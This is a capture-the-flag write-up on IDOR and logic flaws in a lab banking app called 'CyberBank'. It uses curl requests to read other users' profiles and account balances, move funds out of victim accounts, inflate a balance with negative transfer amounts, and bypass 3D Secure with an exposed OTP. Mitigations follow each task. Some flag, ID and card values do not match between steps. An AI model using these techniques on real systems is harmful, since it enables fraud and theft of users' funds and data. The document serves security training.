# Insecure Direct Object Reference

## TASKS

### 0. Uncovering User IDs

    Objective

    Identify and exploit an Insecure Direct Object Reference (IDOR) vulnerability to access another user’s data and retrieve the flag.

    Step 1 – Information Disclosure via Contacts

    The endpoint:

    GET /api/customer/contacts

    returns a list of contacts including:

    customer_id

    id

    linked accounts

    This exposes valid identifiers belonging to other users.

    Step 2 – Enumerating Related Data

    Using the leaked account_id, the endpoint:

    POST /api/accounts/info

    was tested with arbitrary account IDs.
    The server returned account details without verifying ownership, confirming an IDOR vulnerability.

    Step 3 – Identifying a Sensitive Endpoint

    The endpoint:

    GET /api/customer/info/me

    returns the authenticated user’s profile.
    Testing revealed that me could be replaced with another user’s identifier.

    Step 4 – Exploitation

    By replacing me with a leaked customer_id:

    curl -s 'http://web0x06.hbtn/api/customer/info/leaked_customer_id' \
    -H 'Cookie: session=...'

    the application returned another user’s profile, including the flag.

    Root Cause

    The application fails to enforce proper authorization checks.
    User-controlled identifiers (customer_id, account_id) are trusted without verifying that they belong to the authenticated user.

    Impact

    Unauthorized access to other users’ personal and financial data

    Potential account manipulation and data leakage

    Mitigation

    Enforce server-side authorization checks on every request

    Validate that requested resources belong to the authenticated user

    Avoid exposing direct identifiers; use indirect references or access-controlled queries

    Conclusion

    The application is vulnerable to IDOR due to improper access control.
    By enumerating user IDs and reusing them in API requests, it is possible to access sensitive data belonging to other users, leading to full compromise of confidentiality.

### 1. Enumerating Account Numbers for Balance Disclosure
    Objective

    Exploit an IDOR vulnerability in the CyberBank application to:

    Enumerate account numbers using user-related data

    Access unauthorized account details

    Retrieve a hidden flag from another user’s account

    Step 1: Analyze Dashboard API Calls

    While interacting with the dashboard (/dashboard), several API endpoints were identified:

    /api/customer/transactions

    /api/customer/info/me

    /api/accounts/info (POST)

    The most interesting endpoint was:

    POST /api/accounts/info

    With request body:

    {
    "accounts_id": [
        "324824242fdw324324uiui3239248329",
        "328497328934ds7898234789de897878"
    ]
    }
    Observation

    The server returns full account details based solely on client-supplied accounts_id values, without verifying ownership.

    Response Example
    {
    "balance": 143.5,
    "customer_id": "...",
    "id": "...",
    "number": "1089789848044"
    }

    This confirms an IDOR vulnerability.

    Step 2: Extract Account Numbers

    From the response, account numbers were disclosed.

    This demonstrates sensitive data exposure through insecure direct object references.

    Step 3: Enumerate Foreign Account IDs via Transactions

    Next, the transactions endpoint was queried:

    curl -s http://web0x06.hbtn/api/customer/transactions \
    -H 'Cookie: session=...'
    Key Finding

    Transaction data revealed multiple foreign account identifiers:

    sender_payment_id

    receiver_payment_id

    Example:

    {
    "sender_payment_id": "30804e797de54ce093454d2d71612042",
    "receiver_payment_id": "38e19f32ba3f4b87aa7789a3a10f2cbc"
    }
    Extracted Foreign Account IDs

    A list of external account IDs was built, including:

    30804e797de54ce093f25d6761612042
    a8eb7d68c9bd443696def7896052c5b6
    ad412dadb4184a6745648de0e9cfd7c4
    ...
    Step 4: Abuse /api/accounts/info with Foreign IDs

    The vulnerable endpoint was reused with these foreign IDs:

    curl -s http://web0x06.hbtn/api/accounts/info \
    -X POST \
    -H 'Content-Type: application/json' \
    -H 'Cookie: session=...' \
    --data-raw '{"accounts_id":["30804e797de5444093f25d2d71612042"]}'
    Result

    The server returned account details of other users, including:

    account number

    balance

    customer ID

    This confirms horizontal privilege escalation via IDOR.

    Step 5: Discover Hidden Endpoint Variant

    Testing alternative routes revealed:

    GET /api/accounts/info/<account_id>

    When accessed with an invalid value:

    {"message":"Invalid \"account_id\".","status":"failed"}

    This confirmed the endpoint expects a valid account_id.

    Step 6: Retrieve the Flag

    Using a foreign account ID:

    curl -i http://web0x06.hbtn/api/accounts/info/30804e797de54ce0935678d2d71612042 \
    -H 'Cookie: session=...'
    Response
    {
    "flag_1": "f6e78b5360608446792d56768cd3940002",
    "message": {
        "balance": 1751.8,
        "number": "106456707538"
    },
    "status": "success"
    }
    Final Flag
    f6e78b5360608446794565422cd3940002
    Vulnerability Summary
    Type

    Insecure Direct Object Reference (IDOR)

    Impact

    Unauthorized access to other users’ bank accounts

    Disclosure of sensitive financial data

    Exposure of hidden application data (flag)

    Root Cause

    Lack of authorization checks on:

    accounts_id in POST requests

    direct object access via /api/accounts/info/<id>

    Conclusion

    By chaining multiple insecure endpoints:

    Transaction data was used to enumerate foreign account IDs

    Account details were retrieved via a vulnerable API

    A hidden endpoint exposed sensitive data including the flag

    This demonstrates how IDOR vulnerabilities can lead to full data compromise in financial systems.

### 2. Manipulating Wire Transfers to Inflate Account Balance
    Objective

    Exploit weaknesses in the wire transfer functionality to increase the account balance beyond $10,000 and retrieve the flag.

    Step 1: Analyze Transfer Request

    Captured a legitimate wire transfer request:

    POST /api/accounts/transfer_to/<receiver_account_id>

    With body:

    {
    "amount": 50,
    "raison": "test",
    "account_id": "<sender_account_id>",
    "routing": "...",
    "number": "..."
    }
    Observation

    account_id (sender) is fully controllable

    No ownership validation on sender account

    Application trusts client-supplied values

    Step 2: IDOR Exploitation (Fund Theft)

    By replacing account_id with a victim account ID, it was possible to transfer funds from other users:

    {
    "amount": 1000,
    "account_id": "victim_account_id",
    "receiver": "my_account"
    }

    This allowed draining multiple accounts and increasing personal balance.

    Step 3: Balance Consolidation

    Funds were merged into a single account using internal transfers, reaching:

    ~9513.9

    Still below the required $10,000 threshold.

    Step 4: Negative Amount Logic Flaw

    Testing negative values revealed flawed transaction logic:

    sender_balance -= amount

    receiver_balance += amount

    With a negative amount:

    sender gains money

    receiver loses money

    Exploit

    Send a negative transfer from your account to a victim:

    curl -X POST http://web0x06.hbtn/api/accounts/transfer_to/<victim_account_id> \
    -H 'Content-Type: application/json' \
    -H 'Cookie: session=...' \
    --data-raw '{
        "amount": -600,
        "raison": "neg-win",
        "account_id": "<your_account_id>",
        "routing": "...",
        "number": "..."
    }'
    Result

    Your account balance increased

    Victim account decreased

    No validation blocked the transaction

    Step 5: Flag Retrieval

    After exceeding $10,000 total balance:

    {
    "flag_2": "efce0731c2433765764a298885f5301e4d"
    }
    Final Flag
    efce0731c24336354a29ty6ut5f5301e4d
    Vulnerability Summary
    Type

    IDOR (Insecure Direct Object Reference)

    Business Logic Flaw (Improper handling of negative values)

    Impact

    Unauthorized fund transfers from other users

    Arbitrary balance inflation

    Full compromise of financial integrity

    Conclusion

    By chaining:

    IDOR in transfer requests

    Lack of ownership validation

    Improper handling of negative transaction amounts

    it was possible to inflate the account balance beyond the threshold and retrieve the flag.

### 3. Bypassing 3D Secure Verification for Unauthorized Payment
    Overview

    This challenge demonstrates a flaw in the 3D Secure (3DS) implementation of the CyberBank application, where the payment initialization and OTP verification steps are not properly bound together. By exploiting this, it is possible to validate a transaction using an OTP that does not belong to the card being charged.

    Vulnerability

    The application separates the payment flow into three steps:

    POST /api/cards/init_payment
    Initializes a transaction using card details and returns a transaction_id.

    GET /api/cards/3dsecure/<id>
    Returns the OTP and CVV associated with a 3DS session.

    POST /api/cards/confirm_payment/<id>
    Confirms the payment using an OTP and card number.

    The issue lies in the fact that:

    The OTP is exposed via an API endpoint.

    The OTP is not strictly tied to the card or transaction being confirmed.

    The confirmation request allows user-controlled input (number, otp) without validating ownership.

    This results in a broken authentication flow, where the OTP verification step can be bypassed or mismatched.

    Exploitation Steps

    Initiate a payment using your own card:

    POST /api/cards/init_payment

    This returns a valid transaction_id.

    Retrieve the OTP from the 3DS endpoint:

    GET /api/cards/3dsecure/<3ds_id>

    The response directly exposes the OTP (example):

    {
    "OTP": "97228",
    "cvv": "794"
    }

    Intercept the confirmation request:

    POST /api/cards/confirm_payment/<transaction_id>

    Original request:

    {
    "otp": "73228",
    "number": "40006190087567100"
    }

    Modify the OTP using the value obtained from the 3DS endpoint:

    {
    "otp": "97228",
    "number": "4000616575067100"
    }

    Forward the request.

    Result

    The server accepts the modified OTP and confirms the transaction successfully:

    {
    "status": "success",
    "flag_3": "dfd40e44426db87657645ebc78d385c542005"
    }
    Root Cause

    No binding between:

    transaction_id

    3DS session

    card number

    Sensitive data (OTP, CVV) exposed via API

    Server trusts client-supplied OTP and card number without verifying ownership

    Impact

    An attacker can:

    Bypass 3D Secure authentication

    Confirm unauthorized payments

    Potentially charge another user's card using their own OTP session

    Conclusion

    The 3DS mechanism fails due to improper validation and lack of linkage between authentication factors. Secure implementations must ensure that:

    OTPs are never exposed

    OTP validation is strictly bound to the transaction and card

    Server-side checks enforce ownership and integrity of the payment flow
